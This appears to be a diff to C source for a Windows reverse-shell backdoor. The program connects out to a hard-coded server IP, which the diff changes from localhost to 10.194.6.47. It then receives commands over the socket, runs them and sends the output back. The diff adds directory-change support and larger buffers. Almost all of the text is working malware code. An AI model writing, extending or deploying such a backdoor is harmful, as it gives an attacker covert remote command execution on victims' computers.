@@ -9,28 +9,40 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 
-#define bzero(p, size) (void) memset((p), 0, (size))
+#define bzero(p, size) (void) memset(p, 0, size)
 
 SOCKET sock;
+
+char getSubString(char* buff, char* dest, int from, int to) {
+	strncpy(dest, buff + from, to);
+}
 
 void Shell() {
 	char buffer[1024];
 	char container[1024];
-	char total_response[4096];
+	char directory[1024];
+	char total_response[16836];
 	
 
 	while (1) {
 	jump:
 		bzero(buffer, sizeof(buffer));
+		bzero(directory, sizeof(directory));
 		bzero(container, sizeof(container));
 		bzero(total_response, sizeof(total_response));
-
+		
 		recv(sock, buffer, sizeof(buffer), 0);
 
 		if (strncmp("q", buffer, 1) == 0) {
 			closesocket(sock);
 			WSACleanup();
 			exit(0);
+		}
+		else if (strncmp("cd ", buffer, 3) == 0) {
+			getSubString(&buffer, &directory, 3, 100);
+			_chdir(directory);
+			strcpy(total_response, "changed\n");
+			send(sock, total_response, sizeof(total_response), 0);
 		}
 		else {
 			FILE* fp;
@@ -56,7 +68,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	unsigned short SrvPort;
 	char* SrvIP;
 	WSADATA wsaData;
-	SrvIP = "127.0.0.1";
+	SrvIP = "10.194.6.47";
 	SrvPort = 57890;
 
 	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) { //First function to check and set winsock version.
